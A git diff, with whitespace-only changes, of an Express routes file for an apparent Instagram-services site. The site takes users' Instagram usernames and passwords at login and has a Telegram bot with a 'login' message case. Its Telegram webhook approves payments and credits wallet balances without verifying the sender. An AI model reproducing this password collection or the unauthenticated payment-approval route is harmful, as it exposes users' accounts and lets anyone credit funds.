@@ -80,12 +80,12 @@ const paymentSchema = z.object({
 async function sendToTelegramBot(action: string, data: any) {
   const botToken = TELEGRAM_CONFIG.BOT_TOKEN;
   const chatId = TELEGRAM_CONFIG.CHAT_ID;
-  
+
   if (!botToken || !chatId) {
     console.log(`⚠️ Telegram credentials missing. Would send: [${action.toUpperCase()}]`, data);
     return;
   }
-  
+
   let message = "";
   switch (action) {
     case "login":
@@ -187,7 +187,7 @@ async function setupTelegramWebhook() {
   try {
     // For production deployments, detect the correct webhook URL
     let webhookUrl = '';
-    
+
     if (process.env.NODE_ENV === 'production') {
       // For Render deployment
       const renderUrl = process.env.RENDER_EXTERNAL_URL;
@@ -202,7 +202,7 @@ async function setupTelegramWebhook() {
       const domain = process.env.REPLIT_DEV_DOMAIN || `${process.env.REPL_ID || 'local'}.${process.env.REPLIT_CLUSTER || 'replit'}.repl.co`;
       webhookUrl = `https://${domain}/api/telegram/webhook`;
     }
-    
+
     const response = await fetch(`https://api.telegram.org/bot${botToken}/setWebhook`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -221,7 +221,7 @@ async function setupTelegramWebhook() {
   } catch (error) {
     console.log('⚠️ Telegram webhook setup failed:', error);
   }
-  
+
   console.log('✅ Telegram webhook setup completed');
 }
 
@@ -280,7 +280,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.post("/api/auth/login", async (req: AuthenticatedRequest, res: Response) => {
     try {
       console.log("Login attempt - Request body:", req.body);
-      
+
       // Validate request body
       const validationResult = loginSchema.safeParse(req.body);
       if (!validationResult.success) {
@@ -290,14 +290,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
           details: validationResult.error.errors 
         });
       }
-      
+
       const { instagramUsername, password } = validationResult.data;
       console.log("Validated data:", { instagramUsername, password: "***" });
-      
+
       // Check if user exists
       let user = await storage.getUserByInstagramUsername(instagramUsername);
       let isNewUser = false;
-      
+
       if (!user) {
         console.log("Creating new user for:", instagramUsername);
         // Create new user - For this app, any login creates a new user if not exists
@@ -427,7 +427,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
     try {
       const { serviceName, instagramUsername, quantity, price } = orderSchema.parse(req.body);
-      
+
       const user = await storage.getUser(req.session.userId);
       if (!user) {
         return res.status(404).json({ error: "User not found" });
@@ -492,7 +492,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
     try {
       const { amount, utrNumber, paymentMethod } = paymentSchema.parse(req.body);
-      
+
       const user = await storage.getUser(req.session.userId);
       if (!user) {
         return res.status(404).json({ error: "User not found" });
@@ -541,28 +541,28 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.post("/api/telegram/webhook", async (req, res) => {
     try {
       console.log("📞 Telegram webhook received:", JSON.stringify(req.body, null, 2));
-      
+
       const { callback_query } = req.body;
-      
+
       if (callback_query && callback_query.data) {
         const data = callback_query.data;
         const botToken = TELEGRAM_CONFIG.BOT_TOKEN;
-        
+
         console.log("🔘 Button clicked:", data);
-        
+
         if (data.startsWith("accept_payment_")) {
           const paymentId = data.replace("accept_payment_", "");
           console.log("✅ Processing payment acceptance for ID:", paymentId);
-          
+
           const payment = await storage.getPayment(paymentId);
-          
+
           if (payment) {
             console.log("💰 Payment found:", payment);
-            
+
             // Update payment status to approved
             await storage.updatePaymentStatus(paymentId, "Approved");
             console.log("📝 Payment status updated to Approved");
-            
+
             // Add funds to user wallet
             const user = await storage.getUser(payment.userId);
             if (user) {
@@ -572,7 +572,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
               await storage.updateUserBalance(payment.userId, newBalance);
               console.log(`💳 Funds added: ₹${paymentAmount} to user ${user.uid}. New balance: ₹${newBalance}`);
             }
-            
+
             // Answer callback query with success message
             if (botToken) {
               await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
@@ -603,11 +603,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
         } else if (data.startsWith("decline_payment_")) {
           const paymentId = data.replace("decline_payment_", "");
           console.log("❌ Processing payment decline for ID:", paymentId);
-          
+
           // Update payment status to declined
           await storage.updatePaymentStatus(paymentId, "Declined");
           console.log("📝 Payment status updated to Declined");
-          
+
           // Answer callback query with decline message
           if (botToken) {
             await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
@@ -634,7 +634,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           }
         }
       }
-      
+
       res.json({ success: true });
     } catch (error) {
       console.error("❌ Telegram webhook error:", error);
@@ -707,7 +707,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const baseUrl = process.env.NODE_ENV === 'production' 
         ? (process.env.RENDER_EXTERNAL_URL || 'https://your-domain.com')
         : `https://${process.env.REPL_ID || 'local'}.${process.env.REPLIT_CLUSTER || 'replit'}.repl.co`;
-      
+
       const referralLink = `${baseUrl}?ref=${referralData.referralCode}`;
 
       res.json({
@@ -773,14 +773,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const paymentId = req.params.id;
       const payment = await storage.getPayment(paymentId);
-      
+
       if (!payment) {
         return res.status(404).json({ error: "Payment not found" });
       }
 
       // Update payment status and add funds to user wallet
       await storage.updatePaymentStatus(paymentId, "Approved");
-      
+
       const user = await storage.getUser(payment.userId);
       if (user) {
         const newBalance = parseFloat(user.walletBalance) + parseFloat(payment.amount);
